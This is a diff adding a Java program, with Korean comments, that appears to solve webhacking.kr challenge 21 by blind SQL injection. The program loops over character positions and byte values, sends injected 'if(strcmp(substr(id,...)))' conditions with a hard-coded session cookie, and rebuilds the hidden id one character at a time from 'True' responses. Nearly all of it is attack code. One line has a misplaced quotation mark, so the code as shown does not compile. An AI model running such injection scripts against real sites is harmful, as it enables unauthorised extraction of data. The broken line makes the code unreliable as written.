@@ -1,0 +1,45 @@
+package challenge21;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class Main{
+
+  public static HttpURLConnection conn=null;
+  public static String answer="";
+  
+  public static void main(String[] args){
+    URL url=null;
+    try{
+      for(int i=1; i<=5; i++){
+        for(byte j=0x30; j<=0x7A; j++){
+          /* 서버로 데이터 전송하기 */
+          url = new URL("http://webhacking.kr/challenge/bonus/bonus-1/index.php?no="+
+              "if(strcmp(substr(id,"+i+",1),0x"+Integer.toHexString(j)+"),0,1)");
+          conn=(HttpURLConnection) url.openConnection();
+          conn.setRequestProperty("Cookie","PHPSESSID="99729465facd33bb35422d6a72963e42");
+          conn.connect();
+          
+          /* 서버로부터 반환된 HTML 문서 읽어오기 */
+          InputStream is = conn.getInputStream();
+          BufferedReader in = new BufferedReader(new InputStreamReader(is));
+          String result = "";
+          while(true){
+            String line=in.readLine();
+            if(line==null)break;
+            result +=line;
+            }
+          if(result.contains("True")){
+            answer += (char)j;
+            break;
+           }
+         }
+        }
+      }catch(Exception e){
+          e.printStackTrace();
+       }
+       System.out.println(answer);
+      }
+   }
